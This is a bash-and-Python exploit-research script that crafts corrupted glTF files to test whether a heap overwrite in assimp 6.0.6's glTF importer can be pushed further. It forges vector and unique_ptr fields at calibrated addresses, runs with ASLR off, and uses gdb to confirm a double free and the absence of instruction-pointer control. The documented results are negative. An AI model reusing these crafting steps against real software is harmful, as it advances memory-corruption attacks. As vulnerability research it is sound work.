#!/usr/bin/env bash
# W23: two bounded negatives that close "can W22 go further?" questions.
#
# (A) W22's vector destructor aborted because begin pointed into the decoded
#     buffer. Steering begin instead to that buffer's ALLOCATION START makes
#     the destructor's deallocate valid, but the buffer is owned by a
#     shared_ptr in the Asset; the import still aborts with a double free at
#     shared_ptr release. No clean plain-process return by this route.
# (B) The file-chosen 64-byte window word at offset 36 overwrites a stale
#     ld.so symbol-lookup residue, not a live return address. ImportMeshes'
#     saved RIP is >0x400 bytes above the memcpy destination. No IP control.
#
# Reuses W22's gdb recalibration so absolute addresses are fresh per tree.
# Author-measured, unwitnessed; no r5.
set -euo pipefail
cd "$(dirname "$0")/.."

if [ ! -x harness/bin/w5_real_vuln ]; then bash harness/run-w5.sh >/dev/null; fi
if [ ! -x harness/bin/w9_real_7090 ]; then bash harness/run-w9.sh >/dev/null; fi
bash harness/run-w22.sh >/dev/null

src=pins/assimp-6.0.6
sha256sum -c PINS.sha256 >/dev/null
ev=w23/evidence
mkdir -p "$ev"
trace="$ev/w23.trace"
log="$ev/w23.log"
: >"$trace"
: >"$log"
pass=0
fail=0
check() { # name, required substring
    local name="$1" need="$2"
    if ! grep -qF "$need" "$trace"; then
        printf 'FAIL %s (missing: %s)\n' "$name" "$need" | tee -a "$log"; fail=$((fail+1)); return
    fi
    printf 'PASS %s\n' "$name" | tee -a "$log"; pass=$((pass+1))
}

sha256sum "$src/code/AssetLib/glTF/glTFAsset.inl" \
          "$src/code/AssetLib/glTF/glTFImporter.cpp" >"$ev/source-hashes.out"

g++ -O2 -g -U_FORTIFY_SOURCE -DNDEBUG -fno-omit-frame-pointer \
    -I "$src/include" -I build-min-plain-nf-o2/include \
    harness/w23_driver.cpp -L build-min-plain-nf-o2/bin -lassimp \
    -Wl,-rpath,"$PWD/build-min-plain-nf-o2/bin" -o harness/bin/w23_plain_o2

# --- Craft at fixed document length from W22's calibrated window. -----------
python3 - <<'PY'
import base64, json, pathlib
ev = pathlib.Path('w23/evidence')
w22 = pathlib.Path('w22/evidence')
bufl = int((w22 / 'bufbase.txt').read_text().strip(), 16)
win = bytearray.fromhex((w22 / 'window.hex').read_text().strip())
d0 = json.loads((w22 / 'base140.gltf').read_text())
b0 = bytearray(base64.b64decode(d0['buffers']['buf']['uri'].split('base64,', 1)[1]))
prefix = d0['buffers']['buf']['uri'].split('base64,', 1)[0]
assert len(b0) == 140 and len(win) == 64
(ev / 'window-word36.txt').write_text(hex(int.from_bytes(win[36:44], 'little')) + '\n')

def build(name, begin, finish, cap):
    d = json.loads(json.dumps(d0)); b = bytearray(b0); w = bytearray(win)
    w[12:20] = begin.to_bytes(8, 'little')
    w[20:28] = finish.to_bytes(8, 'little')
    w[28:36] = cap.to_bytes(8, 'little')
    b[36:100] = w
    b[0:8] = (bufl + 16).to_bytes(8, 'little')   # fake unique_ptr slot
    b[16:20] = (0).to_bytes(4, 'little')         # mPrimitiveTypes
    b[20:24] = (90).to_bytes(4, 'little')        # chosen mNumVertices
    b[24:28] = (165).to_bytes(4, 'little')       # chosen mNumFaces
    d['buffers']['buf']['uri'] = prefix + 'base64,' + base64.b64encode(bytes(b)).decode()
    p = ev / (name + '.gltf'); p.write_text(json.dumps(d, indent=2))
    assert p.stat().st_size == (w22 / 'base140.gltf').stat().st_size

build('startptr', bufl, bufl + 8, bufl + 8)
ob = int.from_bytes(win[12:20], 'little')
of = int.from_bytes(win[20:28], 'little')
oc = int.from_bytes(win[28:36], 'little')
build('nooverstart', ob, of, oc)
print('BUFL %s' % hex(bufl))
PY
printf 'WORD36 %s BUFBASE %s\n' "$(cat "$ev/window-word36.txt")" "$(cat w22/evidence/bufbase.txt)" >>"$trace"
base=$(wc -c <"$ev/startptr.gltf")
printf 'DOC bytes=%s\n' "$base" >>"$trace"

# --- (A) allocation-start steering: double free at shared_ptr release. ------
rc=0
setarch x86_64 -R harness/bin/w23_plain_o2 "$ev/startptr.gltf" \
    >"$ev/startptr.out" 2>&1 || rc=$?
printf 'CTL startptr rc=%s %s\n' "$rc" \
    "$(grep -m1 'double free detected' "$ev/startptr.out" || true)" >>"$trace"

gdb -q -batch -ex 'set disable-randomization on' -ex run -ex 'bt 14' \
    --args harness/bin/w23_plain_o2 "$ev/startptr.gltf" \
    >"$ev/startptr-gdb.out" 2>&1 || true
printf 'GDB second-free=%s\n' \
    "$(grep -m1 '_Sp_counted_base' "$ev/startptr-gdb.out" || true)" >>"$trace"

rc=0
setarch x86_64 -R harness/bin/w23_plain_o2 "$ev/nooverstart.gltf" \
    >"$ev/nooverstart.out" 2>&1 || rc=$?
printf 'CTL noover rc=%s %s\n' "$rc" \
    "$(grep -m1 '^ptr0=' "$ev/nooverstart.out" || true)" >>"$trace"

# --- (B) the offset-36 window word is a stale ld.so residue, not an IP. -----
word36=$(cat "$ev/window-word36.txt")
gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
    -ex 'break glTFImporter.cpp:475' \
    -ex "run w22/evidence/base140.gltf" \
    -ex "info symbol $word36" -ex 'info frame' \
    --args harness/bin/w23_plain_o2 w22/evidence/base140.gltf \
    >"$ev/ip-residue.out" 2>&1 || true
printf 'IP residue=%s\n' \
    "$(grep -m1 '_dl_lookup_symbol_x' "$ev/ip-residue.out" || true)" >>"$trace"
python3 - "$ev/ip-residue.out" w22/evidence/w22.trace >>"$trace" <<'PY'
import pathlib, re, sys
t = pathlib.Path(sys.argv[1]).read_text()
trace = pathlib.Path(sys.argv[2]).read_text()
m = re.search(r'rip at (0x[0-9a-f]+)', t)
d = re.search(r'^DISC dst=(0x[0-9a-f]+)', trace, re.M)
if m and d:
    gap = int(m.group(1), 16) - int(d.group(1), 16)
    print('IP saved-rip-slot-minus-dst=0x%x far=%d' % (gap, 1 if gap >= 0x400 else 0))
else:
    print('IP saved-rip-slot-minus-dst=UNKNOWN far=0')
PY

# --- Controls. --------------------------------------------------------------
rc=0
setarch x86_64 -R harness/bin/w23_plain_o2 harness/cases/safe.gltf \
    >"$ev/safe.out" 2>&1 || rc=$?
printf 'CTL safe rc=%s %s\n' "$rc" \
    "$(grep -m1 '^case=' "$ev/safe.out" || true)" >>"$trace"
rc=0
harness/bin/w23_plain_o2 "$ev/startptr.gltf" >"$ev/aslr-on.out" 2>&1 || rc=$?
printf 'NEG aslr-on rc=%s\n' "$rc" >>"$trace"

check calibration 'WORD36 '
check doc 'DOC bytes=1278'
check 'A: shared_ptr-owned buffer double free' 'double free detected in tcache 2'
check 'A: second free from shared_ptr release' '_Sp_counted_base'
check 'A: causal no-overwrite control' 'CTL noover rc=0'
check 'A: no-overwrite keeps real mesh fields' 'verts0=3 faces0=1'
check 'B: offset-36 word is stale ld.so residue' 'IP residue=_dl_lookup_symbol_x'
check 'B: no saved RIP inside write window' 'far=1'
check 'safe input imports' 'CTL safe rc=0'
printf 'TOTAL pass=%d fail=%d\n' "$pass" "$fail" >>"$trace"
sha256sum "$trace" >"$ev/w23.trace.sha256"
cat "$trace"
[ "$fail" -eq 0 ]
